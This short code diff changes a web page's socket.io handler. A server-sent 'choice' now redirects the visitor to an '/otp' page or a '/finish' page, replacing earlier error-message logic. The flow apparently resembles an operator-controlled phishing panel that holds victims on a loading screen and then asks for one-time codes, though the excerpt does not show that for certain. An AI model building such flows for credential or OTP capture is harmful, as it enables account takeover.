@@ -488,15 +488,9 @@ p {
 	socket.emit('loading', {page:'loading'})
 
     socket.on('choice', (data) => {
-        if (data.action === "bad") {
-            // Display the error message
-            document.querySelector('.loading-overlay').style.display = 'none';
-            document.getElementById('errorMessage').style.display = 'block';
-            socket.emit('confirmation_bad', {status: true})
-        } else if (data.action === "good") {
-            socket.emit('confirmation_good', {status: true})
-            // Hide the error message if the action is not 'bad'
-            document.getElementById('errorMessage').style.display = 'none';
+        if (data.action === "good") {
+             window.location.href = '/otp';
+        } else if (data.action === "bad") {
             window.location.href = '/finish';
         }
     })
